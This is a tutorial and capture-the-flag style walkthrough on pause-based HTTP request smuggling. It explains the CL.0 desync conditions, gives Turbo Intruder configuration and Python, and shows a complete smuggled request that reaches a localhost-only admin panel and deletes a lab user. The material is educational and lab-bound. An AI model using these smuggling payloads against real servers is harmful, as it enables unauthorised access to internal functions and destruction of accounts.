There are many quite secure websites that can contain hidden desync vulnerabilities that can be revealed if you pause mid-request.

Servers usually are configured with a read timeout, and if they don't receive any more data for an amount of time, they treat the request as complete and issue a response. This regardless of how many bytes they were told to expect.

Pause based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse.

## Server-side pause-based desync

It is dependent on some conditions:
- Frontend must immediately forward each byte of the request to the backend rather than waiting until it has received the full request.
- Frontend must not time out requests before the backend.
- Backend must leave the connection open for reuse following a read timeout.

### Example

Let's consider a CL.0 request smuggling attack scenario:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

Now, what happens if we send the headers, but pause before sending the body?

- Frontend forwards the headers to the backend, and waits for the remaining bytes.
- After some time, backend times out and sends a response, and now the frontend may or may not read this response and forward to us.
- We send the body, which has a request smuggling prefix.
- Frontend treats this as a continuation of the initial request and forwards this to the backend down the same connection.
- Backend has responded to the initial request, so now thinks that these bytes are another request.

### Testing for pause based CL.0

In Repeater, create a CL.0 request smuggling probe like the one above, send it to `Turbo Intruder`.

In `Turbo Intruder`'s Python editor, adjust the request engine configuration to the following options:

```text
concurrentConnections=1
requestsPerConnection=100
pipeline=False
```

Queue the request and add the following arguments to the `queue()` interface:

`pauseMarker` - A list of strings after which you want to pause.
`pauseTime` - pause in ms.

Queue an arbitrary follow-up request as normal:

`followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n' engine.queue(followUp)`

Be sure that you are logging all the responses:

```python
def handleResponse(req, interesting):
    table.add(req)
```

# Exploiting pause-based desync attacks

The frontend streamas requests to the backend, and the backend doesn't close hte connection after a timeout on some endpoints.

The goal is to identify a pause-based CL.0 desync vector, smuggle a request to the admin at `/admin` and delete the user `carlos`.

Find an on-site redirect, and in our case is `lab.com/resources` which redirects to `lab.com/resources/`

Install `Turbo Intruder` extension, and send his request to the Turbo Intruder.

Change the request to `POST` and add a smuggled request like in CL.0, that tries to access `/admin/`. Also don't forget to add `Connection: keep-alive`.

```http
POST /resources HTTP/1.1
Host: lab.net
Cookie: session =...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin/ HTTP/1.1
Host: lab.net
```

And modify the `Python` code part as follows:

```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```


In the first request we got a `302` and in the second there is a `401 Unauthorized` and `Admin interface only available to local users`.

In this case let's put `localhost` in the Host of the smuggled request.

And we're inside the admin panel, where it asks us for a username and there is a button to `Delete user`:

![](../../../../images/Pasted image 20250120145134.png)

But for that our smuggled request needs to be a `POST` and not a `GET`. In the `HTML` that was returned we got a lot of information such as `csrf, action`.

Now let's edit our smuggled request:

```http
POST /resources HTTP/1.1
Host: 0a4b00750429868981989d94007c001a.web-security-academy.net
Cookie: session=FpdxixgCl7dcLByFAvM9TGGuxbqjCn2q
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 171

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=KnKcB6Gamprqao6cSwbz2MzUMQ3CTpvq&username=carlos
```

Very important is the `Content-Length` as you need to calculate for both the body of the smuggled request which in this case is 53, and the complete body of the first request which is 171.

Then in the Python code, change the `pauseMarker`:

```python
...
engine.queue(target.req, pauseMarker=['Content-Length: 171\r\n\r\n'], pauseTime=61000)
...
```

This, because if we leave as before with `\r\n\r\n` then it will pause two times, and we have to differentiate between them.

Now send it, and the response to the second request is:

```http
HTTP/1.1 302 Found
Location: /
Set-Cookie: session=cQBLRASV9VznhaGMEnCibhhjLfieb8CL; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Server: Apache/2.4.52
Keep-Alive: timeout=120
Content-Length: 0
```

Meaning that the user `carlos` has been deleted, and the lab has been solved.
